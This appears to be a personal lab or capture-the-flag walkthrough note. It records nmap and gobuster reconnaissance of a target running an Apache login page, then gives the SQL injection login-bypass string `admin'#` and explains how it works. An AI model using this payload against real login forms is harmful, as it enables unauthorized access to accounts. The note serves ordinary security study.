---
tags:
  - hacking
---
# Topics

> [!hint] See also [[SQL]]

- SQL

# Steps

- Ping target machine
- Do a port scan using [[nmap]]

```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-08-31 23:32 CEST
Nmap scan report for <target_ip>
Host is up (0.025s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Login


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.56 seconds

```

- Connection to the server via a browser yields this website
![[IMG-2024-09-01-070110624.png]]

- Use [[gobuster]] to scan for any open websites

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://<target_ip>/
[+] Threads      : 10
[+] Wordlist     : Discovery/Web-Content/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2024/09/01 00:02:17 Starting gobuster
=====================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/vendor (Status: 301)
/fonts (Status: 301)
=====================================================
2024/09/01 00:06:26 Finished
=====================================================
```

- Use a fake login name
	- `admin'#`
	- The closing quote closes the query. The hash comments out the rest of the query. This effectively bypasses the query for the password and allows any password to be used.
